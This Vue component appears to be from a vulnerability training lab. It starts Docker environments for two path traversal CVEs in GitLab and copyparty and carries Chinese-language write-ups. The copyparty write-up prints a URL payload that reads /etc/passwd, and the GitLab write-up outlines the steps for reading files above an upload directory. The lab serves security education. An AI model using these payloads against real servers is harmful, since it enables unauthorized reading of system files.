<script setup>

import { ref, onMounted } from 'vue';

const isLoading = ref({
    test1: false,
    test2: false,
});
const imagePath = ref('');

// 从本地存储中获取初始状态
const Unauth_DockerComposeUp = ref(localStorage.getItem('Unauth_DockerComposeUp') === 'true');
const Unauth_test2Up = ref(localStorage.getItem('Unauth_test2Up') === 'true');

const test1 = 'CVE-2023-2825';
const test2 = 'CVE-2023-37474';

const toggleDockerCompose = async (directory) => {
    try {
        isLoading.value[directory] = true;

        if (directory === test1) {

            if (Unauth_DockerComposeUp.value) {
                await stopEnvironment(directory);
            } else {
                await startEnvironment(directory);
            }
            Unauth_DockerComposeUp.value = !Unauth_DockerComposeUp.value;

            // 存储按钮状态
            localStorage.setItem('Unauth_DockerComposeUp', Unauth_DockerComposeUp.value);
        }

        // test2
        if (directory === test2) {

            if (Unauth_test2Up.value) {
                await stopEnvironment(directory);
            } else {
                await startEnvironment(directory);
            }
            Unauth_test2Up.value = !Unauth_test2Up.value;

            localStorage.setItem('Unauth_test2Up', Unauth_test2Up.value);
        }

    } catch (error) {

        console.error('Error toggling Docker Compose:', error);

    } finally {

        isLoading.value[directory] = false;

    }
};

const startEnvironment = async (directory) => {
    try {
        // await axios.post('/startEnvironment', { directory });
        const response = await axios.post('/startEnvironment', { directory });
        imagePath.value = response.data.imagePath;
    } catch (error) {
        console.error('Error starting environment:', error);
    }
};

const stopEnvironment = async (directory) => {
    try {
        await axios.post('/stopEnvironment', { directory });
    } catch (error) {
        console.error('Error stopping environment:', error);
    }
};

onMounted(() => {
    // 组件加载后从本地存储中恢复按钮状态
    Unauth_DockerComposeUp.value = localStorage.getItem('Unauth_DockerComposeUp') === 'true';
    Unauth_test2Up.value = localStorage.getItem('Unauth_test2Up') === 'true';
});

</script>


<template>
    <div class="content-header">
        <div class="container-fluid">
            <div class="row mb-2">
                <div class="col-sm-6">
                    <h1 class="m-0">Path Traversal Environment</h1>
                </div>
                <div class="col-sm-6">
                    <ol class="breadcrumb float-sm-right">
                        <li class="breadcrumb-item"><router-link to="/admin/home">Home</router-link></li>
                        <li class="breadcrumb-item"><a href="#">Path Traversal</a></li>
                        <li class="breadcrumb-item active">Path Traversal Environment</li>
                    </ol>
                </div>
            </div>
        </div>
    </div>


    <div class="content">
        <div class="container-fluid">
            <div class="card card-primary card-outline">
                <div class="card-header">
                    <h5 class="m-0">CVE-2023-2825 GitLab目录遍历漏洞</h5>
                </div>
                <div class="card-body">
                    <h6 class="card-title">漏洞介绍</h6>
                    <p class="card-text">
                        一个基于git的开源代码管理平台，主要是对软件开发过程中产生的代码和文档进行管理。漏洞信息为：在
                        16.0.0版本中未经身份验证的恶意用户可以使用路径遍历漏洞在嵌套在至少五个组中的公共项目中存在附件时读取服务器上的任意文件。
                    </p>
                    <h6 class="card-title">影响版本</h6>
                    <p class="card-text">
                        GitLab CE/EE v16.0.0</p>

                    <button @click="toggleDockerCompose(test1)" type="button" class="btn card-link"
                        style="min-width: 100px;" :class="Unauth_DockerComposeUp ? 'bg-maroon' : 'btn-primary'"
                        :disabled="isLoading[test1]">
                        <div v-if="isLoading[test1]" class="spinner-border spinner-border-sm" role="status"
                            aria-hidden="true">
                            <span class="sr-only">Loading...</span>
                        </div>
                        <span v-else>{{ Unauth_DockerComposeUp ? '关闭环境' : '启动环境' }}</span>
                    </button>
                    <div v-if="Unauth_DockerComposeUp && imagePath">
                        <p>您可以访问环境：{{ imagePath }}</p>
                    </div>
                </div>
            </div>
            <div class="card collapsed-card">
                <div class="card-header">
                    <h3 class="card-title">Write up</h3>
                    <div class="card-tools">

                        <button type="button" class="btn btn-tool" data-card-widget="collapse"><i
                                class="fas fa-plus"></i></button>
                    </div>

                </div>

                <div class="card-body">

                    <h5 class="title">创建嵌套5个Group的项目，都是公开的 Public。</h5>
                    <img src="/images/gitlab.png" style="max-width: 80%; height: auto;">

                    <h5 class="title">然后在Project 下面提 Issue，上传一个用于测试的flag.txt文件</h5>
                    <img src="/images/gitlab4.png" style="max-width: 80%; height: auto;">
                    <h5 class="title">在Docker 里面找到 txt 的位置</h5>
                    <p class="card-text">find / -name "flag.txt"<br>
                        /var/opt/gitlab/gitlab-rails/uploads/@hashed/6b/86/6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b/325a55b47257753a09e265b95574fc82/flag.txt
                    </p>
                    <h5 class="title">在/var/opt/gitlab/gitlab-rails/uploads/@hashed/ 目录下创建一个新的文件 <br>flag_2024.txt
                        flag_2024.txt在flag.txt的上4级目录</h5>
                    <p class="card-text">echo flag{212f4548-03d1-11ec-ab68-00155db3a27e} >
                        /var/opt/gitlab/gitlab-rails/uploads/@hashed/flag_2024.txt</p>

                    <h5 class="title">获取它的路径，再到容器里找到该文件，创建一个新的文件
                        flag_2024.txt在flag.txt的上4级目录</h5>
                    <h5 class="title">flag.txt文件的URL如下：</h5>
                    <p class="card-text">
                        http://192.168.146.251:8081/group1/group2/group3/group4/group5/project/uploads/325a55b47257753a09e265b95574fc82/flag.txt
                    </p>
                    <img src="/images/gitlab2.png" style="max-width: 80%; height: auto;">


                    <h5 class="title">最后使用curl命令去查看在flag.txt上4级目录的flag_2024.txt文件内容。</h5>
                    <img src="/images/gitlab3.png" style="max-width: 80%; height: auto;">
                </div>

            </div>

            <div class="card card-primary card-outline">
                <div class="card-header">
                    <h5 class="m-0">CVE-2023-37474 copyparty目录遍历漏洞</h5>
                </div>
                <div class="card-body">
                    <h6 class="card-title">漏洞介绍</h6>
                    <p class="card-text">
                        Copyparty 是一个便携式文件服务器。1.8.2 之前的版本存在在“.cpr”子文件夹中检测到的路径遍历漏洞。路径遍历攻击技术允许攻击者访问位于 Web
                        文档根目录之外的文件、目录和命令。此问题已在版本 1.8.2 中包含的提交“043e3c7d”中得到解决。
                    </p>
                    <h6 class="card-title">影响版本</h6>
                    <p class="card-text">
                        Copyparty < 1.8.2</p>

                            <button @click="toggleDockerCompose(test2)" type="button" class="btn card-link"
                                style="min-width: 100px;" :class="Unauth_test2Up ? 'bg-maroon' : 'btn-primary'"
                                :disabled="isLoading[test2]">
                                <div v-if="isLoading[test2]" class="spinner-border spinner-border-sm" role="status"
                                    aria-hidden="true">
                                    <span class="sr-only">Loading...</span>
                                </div>
                                <span v-else>{{ Unauth_test2Up ? '关闭环境' : '启动环境' }}</span>
                            </button>
                            <div v-if="Unauth_test2Up && imagePath">
                                <p>您可以访问环境：{{ imagePath }}</p>
                            </div>
                </div>
            </div>
            <div class="card collapsed-card">
                <div class="card-header">
                    <h3 class="card-title">Write up</h3>
                    <div class="card-tools">

                        <button type="button" class="btn btn-tool" data-card-widget="collapse"><i
                                class="fas fa-plus"></i></button>
                    </div>

                </div>

                <div class="card-body">

                    <h5 class="title">访问：http://127.0.0.1:8085/.cpr/%2Fetc%2Fpasswd</h5>
                    <img src="/images/copy.png" style="max-width: 80%; height: auto;">

                    <h5 class="title">成功获取到以下敏感信息</h5>
                    <img src="/images/copy1.png" style="max-width: 80%; height: auto;">

                </div>

            </div>
        </div>
    </div>
</template>